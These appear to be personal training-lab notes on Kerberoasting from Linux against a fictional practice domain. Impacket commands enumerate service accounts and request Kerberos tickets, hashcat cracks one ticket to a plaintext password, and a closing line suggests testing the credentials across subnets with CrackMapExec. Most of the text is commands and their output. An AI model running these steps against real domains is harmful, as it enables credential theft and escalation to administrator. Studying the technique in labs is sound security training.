# Kerberoasting - From Linux



## Kerberoasting - Performing the Attack

**Depending on your position in a network, this attack can be performed in multiple ways:**

1. From a non-domain joined Linux host using valid domain user credentials.
2. From a domain-joined Linux host as root after retrieving the keytab file.
3. From a domain-joined Windows host authenticated as a domain user.
4. From a domain-joined Windows host with a shell in the context of a domain account.
5. As SYSTEM on a domain-joined Windows host.
6. From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

### Several tools can be utilized to perform the attack:

1. Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
2. A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
3. From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

### Kerberoasting with GetUserSPNs.py
### Listing SPN Accounts with GetUserSPNs.py
    Foresty@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
    Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
    
    Password:
    
    ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation
    ---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
    backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>
    sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>
    MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>
    MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>
    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>
    adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>
    
    
#### Requesting all TGS Tickets
        
     
        ```
        Foresty@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
        
        Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
        
        Password:
        ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation
        ---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
        backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>
        sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>
        MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>
        adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>
        
        $krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca<SNIP>
      
        
#### Requesting a Single TGS ticket
        
        Foresty@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
        
        Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
        
        Password:
        ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation
        ---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>
        $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc<SNIP>

    
#### Cracking the Ticket Offline with Hashcat
    
    Foresty@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting...
    
    <SNIP>
    
    $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a0f<SNIP>:database!
    Session..........: hashcat
    Status...........: Cracked
    Hash.Name........: Kerberos 5, etype 23, TGS-REP
    Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1fTime.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
    Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8Recovered........: 1/1 (100.00%) Digests
    Progress.........: 8765440/14344386 (61.11%)
    Rejected.........: 0/8765440 (0.00%)
    Restore.Point....: 8749056/14344386 (60.99%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: davius07 -> darten170Started: Tue Feb 15 17:44:49 2022
    Stopped: Tue Feb 15 17:45:41 2022
  
    
#### USING THE CREDS
    IF YOU DIDNT KNOW WHAT CREDS ITS INDICATED, YOU CAN USE CRACKMAPEXEC TO PERFORM CHECK ON ALL SUBNETTING IP /24 OR /16
    
